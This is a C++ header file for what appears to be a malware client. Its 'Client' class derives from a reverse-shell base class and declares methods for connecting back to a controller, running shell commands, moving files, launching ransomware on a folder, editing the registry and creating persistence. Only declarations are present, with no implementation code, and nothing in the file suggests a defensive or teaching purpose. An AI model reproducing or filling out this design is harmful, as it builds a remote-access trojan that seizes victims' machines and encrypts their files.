#pragma once 
#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "ReverseShellStandardFunctions.h"

class Client : private ReverseShellStandard
{
public:
	Client(std::string& connectionMessage);

private:
	void Connect() override final;
	void Start(std::string& connectionMessage);
	void FirstConnectionMessage(std::string& connectionMessage);
	OperationType ReadOperationType() override final;
	void RunCommand() override final;
	std::string RunShellCommand(const std::string& command);
	void UploadFile() override final;
	void DownloadFile() override final;
	void RunRansomware() override final;
	void AccessRegistry() override final;
	void CreatePersistence() override final;
	void InvalidOperation() override final;
	bool TellServerIfFileExists(const std::string& filePath);
	long StartRansomware(const std::string& operation, const std::string& startFolder);
};
